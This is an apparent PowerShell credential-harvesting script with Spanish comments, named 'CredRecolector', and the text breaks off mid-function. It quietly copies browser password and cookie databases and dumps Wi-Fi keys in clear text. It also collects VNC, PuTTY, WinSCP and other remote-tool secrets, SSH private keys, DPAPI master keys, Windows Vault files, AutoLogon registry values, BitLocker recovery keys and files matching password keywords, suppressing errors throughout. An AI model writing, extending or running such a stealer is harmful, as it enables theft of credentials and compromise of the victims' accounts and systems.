# Variables base
$bDir_z = $PWD.Path
$rFld_x = "CredRecolector_$(-join ((65..90) + (97..122) | Get-Random -Count 4 | ForEach-Object {[char]$_}))"
$pRes_v = Join-Path $bDir_z $rFld_x
$logFile = Join-Path $pRes_v "recoleccion.log"
$createdFolders = @{}
$foundFiles = $false

# Crear carpeta principal de resultados
try {
    New-Item -Path $pRes_v -ItemType Directory -Force -ErrorAction Stop | Out-Null
    "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Iniciando recolección" | Out-File -FilePath $logFile -Force
} catch {
    exit
}

# Función de registro silencioso
function Write-LogX {
    param([string]$Message)
    try {
        "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] $Message" | Out-File -FilePath $logFile -Append -ErrorAction SilentlyContinue
    } catch {}
}

# Función para crear carpeta solo cuando se necesite
function Ensure-Folder {
    param(
        [string]$FolderPath,
        [string]$FolderKey
    )
    
    if (-not $createdFolders.ContainsKey($FolderKey)) {
        $createdFolders[$FolderKey] = @{
            Path = $FolderPath
            Created = $false
            HasFiles = $false
        }
    }
    
    if (-not $createdFolders[$FolderKey].Created) {
        try {
            New-Item -ItemType Directory -Path $FolderPath -Force -ErrorAction Stop | Out-Null
            $createdFolders[$FolderKey].Created = $true
            return $true
        } catch {
            return $false
        }
    }
    
    return $true
}

# Función para marcar una carpeta como con contenido
function Mark-FolderHasContent {
    param([string]$FolderKey)
    
    if ($createdFolders.ContainsKey($FolderKey)) {
        $createdFolders[$FolderKey].HasFiles = $true
        $script:foundFiles = $true
    }
}

# Función para verificar si un archivo está bloqueado
function Test-FileLocked {
    param([string]$Path)
    
    if (-not (Test-Path -Path $Path -ErrorAction SilentlyContinue)) {
        return $true
    }
    
    try {
        $fileStream = [System.IO.File]::Open($Path, 'Open', 'Read', 'None')
        $fileStream.Close()
        $fileStream.Dispose()
        return $false
    } catch {
        return $true
    }
}

# Función para copiar archivos con manejo de errores
function Copy-FileSecure {
    param(
        [string]$Source,
        [string]$Destination,
        [string]$FolderKey,
        [switch]$CreateDirectoryIfNeeded
    )
    
    if ([string]::IsNullOrEmpty($Source) -or -not (Test-Path -Path $Source -ErrorAction SilentlyContinue)) {
        return $false
    }
    
    if (Test-FileLocked -Path $Source) {
        return $false
    }
    
    try {
        $destDir = Split-Path -Path $Destination -Parent
        if ($CreateDirectoryIfNeeded -and -not (Test-Path -Path $destDir -ErrorAction SilentlyContinue)) {
            New-Item -Path $destDir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
        }
        
        Copy-Item -Path $Source -Destination $Destination -Force -ErrorAction Stop
        
        if ($FolderKey) {
            Mark-FolderHasContent -FolderKey $FolderKey
        }
        
        return $true
    } catch {
        return $false
    }
}

# Función para agregar letras aleatorias a nombres de archivo
function Add-RandomSuffix {
    param([string]$Name)
    $safeName = $Name -replace '[^\w\-\.]', '_'
    return "$safeName`_$(-join ((65..90) + (97..122) | Get-Random -Count 3 | ForEach-Object {[char]$_}))"
}

# 1. CREDENCIALES DE NAVEGADORES
function Get-BrowserCredentials {
    $destFolder = Join-Path $pRes_v "Navegadores"
    $folderKey = "Navegadores"
    
    # Rutas de navegadores
    $browsers = @{
        "Chrome" = @{
            Path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
            Files = @("Login Data", "Cookies", "History", "Web Data")
        }
        "Edge" = @{
            Path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"
            Files = @("Login Data", "Cookies", "History", "Web Data")
        }
        "Firefox" = @{
            Path = "$env:APPDATA\Mozilla\Firefox\Profiles"
            IsDirectory = $true
            ProfileFiles = @("logins.json", "key4.db", "cookies.sqlite", "places.sqlite")
        }
        "Opera" = @{
            Path = "$env:APPDATA\Opera Software\Opera Stable"
            Files = @("Login Data", "Cookies", "History", "Web Data")
        }
        "Brave" = @{
            Path = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default"
            Files = @("Login Data", "Cookies", "History", "Web Data")
        }
    }
    
    # Procesar navegadores
    foreach ($browser in $browsers.Keys) {
        $browserInfo = $browsers[$browser]
        $browserPath = $browserInfo.Path
        
        if ([string]::IsNullOrEmpty($browserPath) -or -not (Test-Path -Path $browserPath -ErrorAction SilentlyContinue)) {
            continue
        }
        
        $browserFound = $false
        $browserFolder = Join-Path $destFolder (Add-RandomSuffix $browser)
        
        if ($browserInfo.IsDirectory) {
            # Caso Firefox (múltiples perfiles)
            try {
                $profiles = Get-ChildItem -Path $browserPath -Directory -ErrorAction SilentlyContinue
                
                foreach ($profile in $profiles) {
                    $profileFound = $false
                    $profileName = $profile.Name
                    $profileFolder = Join-Path $browserFolder "Perfil_$profileName"
                    
                    foreach ($file in $browserInfo.ProfileFiles) {
                        $sourcePath = Join-Path $profile.FullName $file
                        if (Test-Path -Path $sourcePath -ErrorAction SilentlyContinue) {
                            if (-not $browserFound) {
                                Ensure-Folder -FolderPath $destFolder -FolderKey $folderKey
                                $browserFound = $true
                            }
                            
                            if (-not $profileFound) {
                                New-Item -ItemType Directory -Path $profileFolder -Force -ErrorAction SilentlyContinue | Out-Null
                                $profileFound = $true
                            }
                            
                            $destPath = Join-Path $profileFolder $file
                            Copy-FileSecure -Source $sourcePath -Destination $destPath -FolderKey $folderKey
                        }
                    }
                }
            } catch {}
        } else {
            # Caso Chrome/Edge/etc
            foreach ($file in $browserInfo.Files) {
                $sourcePath = Join-Path $browserPath $file
                if (Test-Path -Path $sourcePath -ErrorAction SilentlyContinue) {
                    if (-not $browserFound) {
                        Ensure-Folder -FolderPath $destFolder -FolderKey $folderKey
                        New-Item -ItemType Directory -Path $browserFolder -Force -ErrorAction SilentlyContinue | Out-Null
                        $browserFound = $true
                    }
                    
                    $destPath = Join-Path $browserFolder ($file -replace '\\', '_')
                    Copy-FileSecure -Source $sourcePath -Destination $destPath -FolderKey $folderKey
                }
            }
        }
    }
}

# 2. CREDENCIALES DE WINDOWS
function Get-WindowsCredentials {
    $destFolder = Join-Path $pRes_v "CredWindows"
    $folderKey = "CredWindows"
    
    $hasFiles = $false
    
    # Credential Manager
    $credManPaths = @(
        "$env:APPDATA\Microsoft\Credentials",
        "$env:LOCALAPPDATA\Microsoft\Credentials"
    )
    
    $credManFound = $false
    $credManFolder = Join-Path $destFolder (Add-RandomSuffix "CredentialManager")
    
    foreach ($path in $credManPaths) {
        if (Test-Path -Path $path -ErrorAction SilentlyContinue) {
            $files = Get-ChildItem -Path $path -File -ErrorAction SilentlyContinue
            foreach ($file in $files) {
                if (-not $credManFound) {
                    Ensure-Folder -FolderPath $destFolder -FolderKey $folderKey
                    New-Item -ItemType Directory -Path $credManFolder -Force -ErrorAction SilentlyContinue | Out-Null
                    $credManFound = $true
                    $hasFiles = $true
                }
                
                $destPath = Join-Path $credManFolder $file.Name
                Copy-FileSecure -Source $file.FullName -Destination $destPath -FolderKey $folderKey
            }
        }
    }
    
    # Wi-Fi Profiles
    try {
        $wifiProfiles = netsh wlan show profiles 2>$null | Select-String "All User Profile" | ForEach-Object { ($_ -split ":")[-1].Trim() }
        
        if ($wifiProfiles -and $wifiProfiles.Count -gt 0) {
            $wifiFound = $false
            $wifiProfilesFolder = Join-Path $destFolder (Add-RandomSuffix "WiFi")
            
            foreach ($profile in $wifiProfiles) {
                $profileContent = netsh wlan show profile name="$profile" key=clear 2>$null
                if ($profileContent) {
                    if (-not $wifiFound) {
                        Ensure-Folder -FolderPath $destFolder -FolderKey $folderKey
                        New-Item -ItemType Directory -Path $wifiProfilesFolder -Force -ErrorAction SilentlyContinue | Out-Null
                        $wifiFound = $true
                        $hasFiles = $true
                    }
                    
                    $profileFile = Join-Path $wifiProfilesFolder "$profile.txt"
                    $profileContent | Out-File -FilePath $profileFile -Encoding utf8 -ErrorAction SilentlyContinue
                    Mark-FolderHasContent -FolderKey $folderKey
                }
            }
        }
    } catch {}
    
    # VNC Registry
    try {
        $regKey = "HKLM:\SOFTWARE\RealVNC\WinVNC4"
        if (Test-Path -Path $regKey -ErrorAction SilentlyContinue) {
            $regValues = Get-ItemProperty -Path $regKey -ErrorAction SilentlyContinue
            
            if ($regValues -and ($regValues.Password -or $regValues.PasswordViewOnly)) {
                Ensure-Folder -FolderPath $destFolder -FolderKey $folderKey
                $vncFile = Join-Path $destFolder (Add-RandomSuffix "VNC_Password.txt")
                
                $output = "VNC Registry Information:`r`n"
                
                if ($regValues.Password) {
                    $output += "Password: $($regValues.Password)`r`n"
                    if ($regValues.Password -is [byte[]]) {
                        $output += "Password (Hex): $($regValues.Password | ForEach-Object { $_.ToString('X2') })`r`n"
                    }
                }
                
                if ($regValues.PasswordViewOnly) {
                    $output += "PasswordViewOnly: $($regValues.PasswordViewOnly)`r`n"
                    if ($regValues.PasswordViewOnly -is [byte[]]) {
                        $output += "PasswordViewOnly (Hex): $($regValues.PasswordViewOnly | ForEach-Object { $_.ToString('X2') })`r`n"
                    }
                }
                
                $output | Out-File -FilePath $vncFile -ErrorAction SilentlyContinue
                $hasFiles = $true
                Mark-FolderHasContent -FolderKey $folderKey
            }
        }
    } catch {}
}

# 3. HERRAMIENTAS DE ADMINISTRACIÓN REMOTA
function Get-RemoteAdminTools {
    $destFolder = Join-Path $pRes_v "RemoteAdmin"
    $folderKey = "RemoteAdmin"
    
    $hasFiles = $false
    
    # Configuración de herramientas
    $toolsConfig = @{
        "MobaXterm" = @{
            Paths = @(
                "$env:USERPROFILE\Documents\MobaXterm\MobaXterm.ini",
                "$env:USERPROFILE\Documents\MobaXterm\MXTSessions.ini",
                "$env:USERPROFILE\Documents\MobaXterm\MobaXterm.custom.ini",
                "$env:USERPROFILE\Documents\MobaXterm\MobaXterm.custom.s"
            )
            FolderName = "MobaXterm"
        }
        "PuTTY" = @{
            Paths = @(
                "$env:APPDATA\PuTTY\sessions\"
            )
            FolderName = "PuTTY"
            Registry = "HKCU:\Software\SimonTatham\PuTTY\Sessions"
        }
        "WinSCP" = @{
            Paths = @(
                "$env:APPDATA\WinSCP\WinSCP.ini"
            )
            FolderName = "WinSCP"
            Registry = "HKCU:\Software\Martin Prikryl\WinSCP 2\Sessions"
        }
        "mRemoteNG" = @{
            Paths = @(
                "$env:APPDATA\mRemoteNG\confCons.xml",
                "$env:APPDATA\mRemoteNG\mRemoteNG.xml"
            )
            FolderName = "mRemoteNG"
        }
        "RoyalTS" = @{
            Paths = @(
                "$env:USERPROFILE\Documents\Royal TS V5\*.rtsz",
                "$env:LOCALAPPDATA\code4ward.net\"
            )
            FolderName = "RoyalTS"
        }
        "RDCMan" = @{
            Paths = @(
                "$env:USERPROFILE\Documents\*.rdg",
                "$env:LOCALAPPDATA\Microsoft\Remote Desktop Connection Manager\*.rdg"
            )
            FolderName = "RDCMan"
        }
        "SuperPuTTY" = @{
            Paths = @(
                "$env:USERPROFILE\Documents\SuperPuTTY\Sessions.xml",
                "$env:APPDATA\SuperPuTTY\"
            )
            FolderName = "SuperPuTTY"
        }
        "SecureCRT" = @{
            Paths = @(
                "$env:APPDATA\VanDyke\Config\",
                "$env:APPDATA\VanDyke\Config\Sessions\"
            )
            FolderName = "SecureCRT"
        }
        "XShell" = @{
            Paths = @(
                "$env:USERPROFILE\Documents\NetSarang\Xshell\Sessions\",
                "$env:APPDATA\NetSarang\Xshell\7\"
            )
            FolderName = "XShell"
        }
        "BitviseSSH" = @{
            Paths = @(
                "$env:APPDATA\Bitvise\Bitvise SSH Client\Profiles\",
                "$env:APPDATA\Bitvise\Bitvise SSH Client\"
            )
            FolderName = "BitviseSSH"
        }
        "TeraTerm" = @{
            Paths = @(
                "$env:APPDATA\teraterm\TERATERM.INI",
                "$env:APPDATA\teraterm\macro\"
            )
            FolderName = "TeraTerm"
        }
        "KiTTY" = @{
            Paths = @(
                "$env:APPDATA\KiTTY\Sessions\"
            )
            FolderName = "KiTTY"
        }
        "RDP" = @{
            Paths = @(
                "$env:USERPROFILE\Documents\*.rdp",
                "$env:USERPROFILE\Desktop\*.rdp"
            )
            FolderName = "RDP"
        }
        "SSHKeys" = @{
            Paths = @(
                "$env:USERPROFILE\.ssh\id_rsa",
                "$env:USERPROFILE\.ssh\id_dsa",
                "$env:USERPROFILE\.ssh\id_ecdsa",
                "$env:USERPROFILE\.ssh\id_ed25519",
                "$env:USERPROFILE\.ssh\known_hosts"
            )
            FolderName = "SSHKeys"
        }
    }
    
    # Procesar cada herramienta
    foreach ($tool in $toolsConfig.Keys) {
        $config = $toolsConfig[$tool]
        $toolFound = $false
        $toolFolder = Join-Path $destFolder (Add-RandomSuffix $config.FolderName)
        
        # Procesar archivos
        foreach ($path in $config.Paths) {
            if ($path.EndsWith('\')) {
                # Es un directorio
                if (Test-Path -Path $path -ErrorAction SilentlyContinue) {
                    $files = Get-ChildItem -Path $path -Recurse -File -ErrorAction SilentlyContinue
                    
                    if ($files -and $files.Count -gt 0) {
                        if (-not $toolFound) {
                            Ensure-Folder -FolderPath $destFolder -FolderKey $folderKey
                            New-Item -ItemType Directory -Path $toolFolder -Force -ErrorAction SilentlyContinue | Out-Null
                            $toolFound = $true
                            $hasFiles = $true
                        }
                        
                        foreach ($file in $files) {
                            if (-not (Test-FileLocked -Path $file.FullName)) {
                                $destPath = Join-Path $toolFolder $file.Name
                                Copy-FileSecure -Source $file.FullName -Destination $destPath -FolderKey $folderKey
                            }
                        }
                    }
                }
            } elseif ($path.Contains('*')) {
                # Es un patrón
                try {
                    $files = Get-ChildItem -Path $path -File -ErrorAction SilentlyContinue
                    
                    if ($files -and $files.Count -gt 0) {
                        if (-not $toolFound) {
                            Ensure-Folder -FolderPath $destFolder -FolderKey $folderKey
                            New-Item -ItemType Directory -Path $toolFolder -Force -ErrorAction SilentlyContinue | Out-Null
                            $toolFound = $true
                            $hasFiles = $true
                        }
                        
                        foreach ($file in $files) {
                            $destPath = Join-Path $toolFolder $file.Name
                            Copy-FileSecure -Source $file.FullName -Destination $destPath -FolderKey $folderKey
                        }
                    }
                } catch {}
            } else {
                # Es un archivo específico
                if (Test-Path -Path $path -ErrorAction SilentlyContinue) {
                    if (-not $toolFound) {
                        Ensure-Folder -FolderPath $destFolder -FolderKey $folderKey
                        New-Item -ItemType Directory -Path $toolFolder -Force -ErrorAction SilentlyContinue | Out-Null
                        $toolFound = $true
                        $hasFiles = $true
                    }
                    
                    $destPath = Join-Path $toolFolder (Split-Path -Leaf $path)
                    Copy-FileSecure -Source $path -Destination $destPath -FolderKey $folderKey
                }
            }
        }
        
        # Procesar registro si existe
        if ($config.Registry -and (Test-Path -Path $config.Registry -ErrorAction SilentlyContinue)) {
            try {
                $regProps = Get-Item -Path $config.Registry -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Property
                
                if ($regProps -and $regProps.Count -gt 0) {
                    if (-not $toolFound) {
                        Ensure-Folder -FolderPath $destFolder -FolderKey $folderKey
                        New-Item -ItemType Directory -Path $toolFolder -Force -ErrorAction SilentlyContinue | Out-Null
                        $toolFound = $true
                        $hasFiles = $true
                    }
                    
                    $regFile = Join-Path $toolFolder "registro.txt"
                    $regContent = $regProps | ForEach-Object {
                        $value = Get-ItemProperty -Path $config.Registry -Name $_ -ErrorAction SilentlyContinue | Select-Object -ExpandProperty $_
                        "$_ = $value"
                    }
                    
                    if ($regContent) {
                        $regContent | Out-File -FilePath $regFile -ErrorAction SilentlyContinue
                        Mark-FolderHasContent -FolderKey $folderKey
                    }
                }
            } catch {}
        }
    }
}

# 4. ARCHIVOS DE CONFIGURACIÓN Y CONTRASEÑAS
function Get-ConfigFiles {
    $destFolder = Join-Path $pRes_v "Config"
    $folderKey = "Config"
    
    $hasFiles = $false
    
    # Archivos de contraseñas comunes
    $commonPwdFiles = @(
        "$env:USERPROFILE\passwords.txt",
        "$env:USERPROFILE\Documents\passwords.txt",
        "$env:USERPROFILE\Desktop\passwords.txt",
        "$env:USERPROFILE\Documents\login.txt",
        "$env:USERPROFILE\Documents\credentials.txt",
        "$env:USERPROFILE\Documents\creds.txt",
        "$env:USERPROFILE\contraseña.txt",
        "$env:USERPROFILE\Documents\contraseña.txt",
        "$env:USERPROFILE\Desktop\contraseña.txt",
        "$env:USERPROFILE\Documents\login.txt",
        "$env:USERPROFILE\Documents\credenciales.txt",
        "$env:USERPROFILE\Documents\creds.txt"
    )
    
    $pwdFound = $false
    $pwdFolder = Join-Path $destFolder (Add-RandomSuffix "PasswordFiles")
    
    foreach ($file in $commonPwdFiles) {
        if (Test-Path -Path $file -ErrorAction SilentlyContinue) {
            if (-not $pwdFound) {
                Ensure-Folder -FolderPath $destFolder -FolderKey $folderKey
                New-Item -ItemType Directory -Path $pwdFolder -Force -ErrorAction SilentlyContinue | Out-Null
                $pwdFound = $true
                $hasFiles = $true
            }
            
            $destPath = Join-Path $pwdFolder (Split-Path -Leaf $file)
            Copy-FileSecure -Source $file -Destination $destPath -FolderKey $folderKey
        }
    }
    
    # Buscar archivos con nombres relevantes en carpetas principales
    $searchLocations = @(
        "$env:USERPROFILE\Documents",
        "$env:USERPROFILE\Desktop",
        "$env:USERPROFILE\Downloads"
    )
    
    $searchPatterns = @(
        "*pass*", "*cred*", "*login*", "*secret*", "*.key", "*.pem", "*.pfx", "*.p12", "*.kdbx", "*.kdb"
    )
    
    $searchFound = $false
    $searchResultsFolder = Join-Path $destFolder (Add-RandomSuffix "SearchResults")
    
    foreach ($location in $searchLocations) {
        if (Test-Path -Path $location -ErrorAction SilentlyContinue) {
            foreach ($pattern in $searchPatterns) {
                try {
                    $files = Get-ChildItem -Path $location -File -Include $pattern -ErrorAction SilentlyContinue | Where-Object { $_.Length -lt 5MB }
                    
                    if ($files -and $files.Count -gt 0) {
                        if (-not $searchFound) {
                            Ensure-Folder -FolderPath $destFolder -FolderKey $folderKey
                            New-Item -ItemType Directory -Path $searchResultsFolder -Force -ErrorAction SilentlyContinue | Out-Null
                            $searchFound = $true
                            $hasFiles = $true
                        }
                        
                        foreach ($file in $files) {
                            $destPath = Join-Path $searchResultsFolder $file.Name
                            Copy-FileSecure -Source $file.FullName -Destination $destPath -FolderKey $folderKey
                        }
                    }
                } catch {}
            }
        }
    }
}

# 5. RUTAS ESTÁTICAS DE WINDOWS CON CREDENCIALES
function Get-WindowsSystemCredentials {
    $destFolder = Join-Path $pRes_v "WindowsSystem"
    $folderKey = "WindowsSystem"
    
    $hasFiles = $false
    
    # 1. Archivos de instalación y configuración automática (pueden contener credenciales en texto plano)
    $unattendFiles = @(
        "$env:SystemDrive\unattend.xml",
        "$env:SystemDrive\Windows\Panther\Unattend.xml",
        "$env:SystemDrive\Windows\Panther\Unattend\Unattend.xml", 
        "$env:SystemRoot\System32\Sysprep\Sysprep.xml",
        "$env:SystemRoot\System32\Sysprep\Unattend.xml",
        "$env:SystemRoot\System32\Sysprep\Panther\Unattend.xml",
        "$env:SystemRoot\Panther\Unattend.xml"
    )
    
    $unattendFound = $false
    $unattendFolder = Join-Path $destFolder (Add-RandomSuffix "Unattend")
    
    foreach ($file in $unattendFiles) {
        if (Test-Path -Path $file -ErrorAction SilentlyContinue) {
            if (-not $unattendFound) {
                Ensure-Folder -FolderPath $destFolder -FolderKey $folderKey
                New-Item -ItemType Directory -Path $unattendFolder -Force -ErrorAction SilentlyContinue | Out-Null
                $unattendFound = $true
                $hasFiles = $true
            }
            
            $destPath = Join-Path $unattendFolder (Split-Path -Leaf $file)
            Copy-FileSecure -Source $file -Destination $destPath -FolderKey $folderKey
        }
    }
    
    # 2. Almacén de credenciales y bóveda de Windows
    $vaultPaths = @(
        "$env:LOCALAPPDATA\Microsoft\Vault",
        "$env:LOCALAPPDATA\Microsoft\Windows Vault"
    )
    
    $vaultFound = $false
    $vaultFolder = Join-Path $destFolder (Add-RandomSuffix "Vault")
    
    foreach ($path in $vaultPaths) {
        if (Test-Path -Path $path -ErrorAction SilentlyContinue) {
            $files = Get-ChildItem -Path $path -Recurse -File -ErrorAction SilentlyContinue
            
            if ($files -and $files.Count -gt 0) {
                if (-not $vaultFound) {
                    Ensure-Folder -FolderPath $destFolder -FolderKey $folderKey
                    New-Item -ItemType Directory -Path $vaultFolder -Force -ErrorAction SilentlyContinue | Out-Null
                    $vaultFound = $true
                    $hasFiles = $true
                }
                
                foreach ($file in $files) {
                    if (-not (Test-FileLocked -Path $file.FullName)) {
                        $relativePath = $file.FullName.Substring($path.Length).TrimStart('\')
                        $destPath = Join-Path $vaultFolder ($path.Split('\')[-1] + "_" + $relativePath)
                        $destDir = Split-Path -Path $destPath -Parent
                        
                        if (-not (Test-Path -Path $destDir)) {
                            New-Item -ItemType Directory -Path $destDir -Force -ErrorAction SilentlyContinue | Out-Null
                        }
                        
                        Copy-FileSecure -Source $file.FullName -Destination $destPath -FolderKey $folderKey
                    }
                }
            }
        }
    }
    
    # 3. Protección de Datos (DPAPI) - MasterKeys
    $dpapiPaths = @(
        "$env:APPDATA\Microsoft\Protect",
        "$env:LOCALAPPDATA\Microsoft\Protect"
    )
    
    $dpapiFound = $false
    $dpapiFolder = Join-Path $destFolder (Add-RandomSuffix "DPAPI")
    
    foreach ($path in $dpapiPaths) {
        if (Test-Path -Path $path -ErrorAction SilentlyContinue) {
            $files = Get-ChildItem -Path $path -Recurse -File -ErrorAction SilentlyContinue
            
            if ($files -and $files.Count -gt 0) {
                if (-not $dpapiFound) {
                    Ensure-Folder -FolderPath $destFolder -FolderKey $folderKey
                    New-Item -ItemType Directory -Path $dpapiFolder -Force -ErrorAction SilentlyContinue | Out-Null
                    $dpapiFound = $true
                    $hasFiles = $true
                }
                
                foreach ($file in $files) {
                    if (-not (Test-FileLocked -Path $file.FullName)) {
                        $relativePath = $file.FullName.Substring($path.Length).TrimStart('\')
                        $destPath = Join-Path $dpapiFolder $relativePath
                        $destDir = Split-Path -Path $destPath -Parent
                        
                        if (-not (Test-Path -Path $destDir)) {
                            New-Item -ItemType Directory -Path $destDir -Force -ErrorAction SilentlyContinue | Out-Null
                        }
                        
                        Copy-FileSecure -Source $file.FullName -Destination $destPath -FolderKey $folderKey
                    }
                }
            }
        }
    }
    
    # 4. Tareas programadas (pueden contener credenciales)
    $tasksPath = "$env:SystemRoot\System32\Tasks"
    
    if (Test-Path -Path $tasksPath -ErrorAction SilentlyContinue) {
        try {
            $interestingTasks = Get-ChildItem -Path $tasksPath -Recurse -File -ErrorAction SilentlyContinue | Where-Object {
                $_.Extension -eq ".job" -or $_.Name -match ".*\.(xml|job)$"
            } | Where-Object {
                try {
                    $content = Get-Content -Path $_.FullName -ErrorAction SilentlyContinue
                    $content -match "password|username|credentials|apikey|api_key|key|token|secret"
                }
                catch {
                    $false
                }
            }
            
            if ($interestingTasks -and $interestingTasks.Count -gt 0) {
                $tasksFolder = Join-Path $destFolder (Add-RandomSuffix "ScheduledTasks")
                Ensure-Folder -FolderPath $destFolder -FolderKey $folderKey
                New-Item -ItemType Directory -Path $tasksFolder -Force -ErrorAction SilentlyContinue | Out-Null
                $hasFiles = $true
                
                foreach ($task in $interestingTasks) {
                    $destPath = Join-Path $tasksFolder $task.Name
                    Copy-FileSecure -Source $task.FullName -Destination $destPath -FolderKey $folderKey
                }
            }
        } catch {}
    }
    
    # 5. Claves de registro con autologon y credenciales almacenadas
    $registryPaths = @{
        "AutoLogon" = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
        "StoredUsernames" = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Credentials"
        "TerminalServer" = "HKCU:\Software\Microsoft\Terminal Server Client\Servers"
        "LAPS" = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\LAPS"
    }
    
    $regFound = $false
    $regFolder = Join-Path $destFolder (Add-RandomSuffix "Registry")
    
    foreach ($regName in $registryPaths.Keys) {
        $regPath = $registryPaths[$regName]
        
        if (Test-Path -Path $regPath -ErrorAction SilentlyContinue) {
            try {
                $regValues = Get-ItemProperty -Path $regPath -ErrorAction SilentlyContinue
                
                if ($regValues) {
                    if (-not $regFound) {
                        Ensure-Folder -FolderPath $destFolder -FolderKey $folderKey
                        New-Item -ItemType Directory -Path $regFolder -Force -ErrorAction SilentlyContinue | Out-Null
                        $regFound = $true
                        $hasFiles = $true
                    }
                    
                    $regFile = Join-Path $regFolder "$regName.txt"
                    $regValues | Format-List * | Out-File -FilePath $regFile -ErrorAction SilentlyContinue
                    Mark-FolderHasContent -FolderKey $folderKey
                }
            } catch {}
        }
    }
    
    # 6. Archivos de configuración IIS (credenciales de bases de datos)
    $iisConfigPaths = @(
        "$env:SystemRoot\System32\inetsrv\config\applicationHost.config",
        "$env:SystemRoot\System32\inetsrv\config\web.config"
    )
    
    $iisFound = $false
    $iisFolder = Join-Path $destFolder (Add-RandomSuffix "IIS")
    
    foreach ($file in $iisConfigPaths) {
        if (Test-Path -Path $file -ErrorAction SilentlyContinue) {
            if (-not $iisFound) {
                Ensure-Folder -FolderPath $destFolder -FolderKey $folderKey
                New-Item -ItemType Directory -Path $iisFolder -Force -ErrorAction SilentlyContinue | Out-Null
                $iisFound = $true
                $hasFiles = $true
            }
            
            $destPath = Join-Path $iisFolder (Split-Path -Leaf $file)
            Copy-FileSecure -Source $file -Destination $destPath -FolderKey $folderKey
        }
    }
    
    # 7. Archivos McAfee SiteList.xml (contienen credenciales)
    $mcafeePaths = @(
        "$env:ProgramData\McAfee\Common Framework\SiteList.xml",
        "${env:ProgramFiles(x86)}\McAfee\Common Framework\SiteList.xml",
        "$env:ProgramFiles\McAfee\Common Framework\SiteList.xml",
        "$env:ALLUSERSPROFILE\Application Data\McAfee\Common Framework\SiteList.xml"
    )
    
    $mcafeeFound = $false
    $mcafeeFolder = Join-Path $destFolder (Add-RandomSuffix "McAfee")
    
    foreach ($file in $mcafeePaths) {
        if (Test-Path -Path $file -ErrorAction SilentlyContinue) {
            if (-not $mcafeeFound) {
                Ensure-Folder -FolderPath $destFolder -FolderKey $folderKey
                New-Item -ItemType Directory -Path $mcafeeFolder -Force -ErrorAction SilentlyContinue | Out-Null
                $mcafeeFound = $true
                $hasFiles = $true
            }
            
            $destPath = Join-Path $mcafeeFolder (Split-Path -Leaf $file)
            Copy-FileSecure -Source $file -Destination $destPath -FolderKey $folderKey
        }
    }
    
    # 8. Credenciales de Bitlocker
    try {
        $bitlockerPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\BitLocker\Recovery"
        
        if (Test-Path -Path $bitlockerPath -ErrorAction SilentlyContinue) {
            $bitlockerKeys = Get-ChildItem -Path $bitlockerPath -ErrorAction SilentlyContinue
            
            if ($bitlockerKeys -and $bitlockerKeys.Count -gt 0) {
                $bitlockerFolder = Join-Path $destFolder (Add-RandomSuffix "Bitlocker")
                Ensure-Folder -FolderPath $destFolder -FolderKey $folderKey
                New-Item -ItemType Directory -Path $bitlockerFolder -Force -ErrorAction SilentlyContinue | Out-Null
                $hasFiles = $true
                
                $bitlockerFile = Join-Path $bitlockerFolder "recovery_keys.txt"
                foreach ($key in $bitlockerKeys) {
                    $values = Get-ItemProperty -Path $key.PSPath -ErrorAction SilentlyContinue
                    $values | Format-List * | Out-File -FilePath $bitlockerFile -Append -ErrorAction SilentlyContinue
                }
                
                Mark-FolderHasContent -FolderKey $folderKey
            }
        }
    } catch {}
    
    # 9. Scripts del sistema que pueden contener credenciales
    $scriptLocations = @(
        "$env:SystemDrive\Scripts",
        "$env:ProgramData\Scripts"
    )
    
    $scriptFound = $false
    $scriptFolder = Join-Path $destFolder (Add-RandomSuffix "Scripts")
    
    foreach ($location in $scriptLocations) {
        if (Test-Path -Path $location -ErrorAction SilentlyContinue) {
            try {
                $scripts = Get-ChildItem -Path $location -Recurse -File -Include "*.ps1", "*.bat", "*.vbs", "*.cmd" -ErrorAction SilentlyContinue | Where-Object {
                    try {
                        $content = Get-Content -Path $_.FullName -ErrorAction SilentlyContinue
                        $content -match "password|credentials|apikey|api_key|key|token|secret|pwd|pass"
                    }
                    catch {
                        $false
                    }
                }
                
                if ($scripts -and $scripts.Count -gt 0) {
                    if (-not $scriptFound) {
                        Ensure-Folder -FolderPath $destFolder -FolderKey $folderKey
                        New-Item -ItemType Directory -Path $scriptFolder -Force -ErrorAction SilentlyContinue | Out-Null
                        $scriptFound = $true
                        $hasFiles = $true
                    }
                    
                    foreach ($script in $scripts) {
                        $destPath = Join-Path $scriptFolder $script.Name
                        Copy-FileSecure -Source $script.FullName -Destination $destPath -FolderKey $folderKey
                    }
                }
            } catch {}
        }
    }
    
    # 10. Transcripciones de PowerShell (pueden contener comandos con credenciales)
    $transcriptPaths = @(
        "$env:USERPROFILE\Documents\PowerShell_transcript*",
        "$env:SystemDrive\Transcripts\"
    )
    
    $transcriptFound = $false
    $transcriptFolder = Join-Path $destFolder (Add-RandomSuffix "Transcripts")
    
    foreach ($path in $transcriptPaths) {
        if ($path.Contains('*')) {
            try {
                $files = Get-ChildItem -Path $path -File -ErrorAction SilentlyContinue
                
                if ($files -and $files.Count -gt 0) {
                    if (-not $transcriptFound) {
                        Ensure-Folder -FolderPath $destFolder -FolderKey $folderKey
                        New-Item -ItemType Directory -Path $transcriptFolder -Force -ErrorAction SilentlyContinue | Out-Null
                        $transcriptFound = $true
                        $hasFiles = $true
                    }
                    
                    foreach ($file in $files) {
                        $destPath = Join-Path $transcriptFolder $file.Name
                        Copy-FileSecure -Source $file.FullName -Destination $destPath -FolderKey $folderKey
                    }
                }
            } catch {}
        } else {
            if (Test-Path -Path $path -ErrorAction SilentlyContinue) {
                $files = Get-ChildItem -Path $path -Recurse -File -ErrorAction SilentlyContinue
                
                if ($files -and $files.Count -gt 0) {
                    if (-not $transcriptFound) {
                        Ensure-Folder -FolderPath $destFolder -FolderKey $folderKey
                        New-Item -ItemType Directory -Path $transcriptFolder -Force -ErrorAction SilentlyContinue | Out-Null
                        $transcriptFound = $true
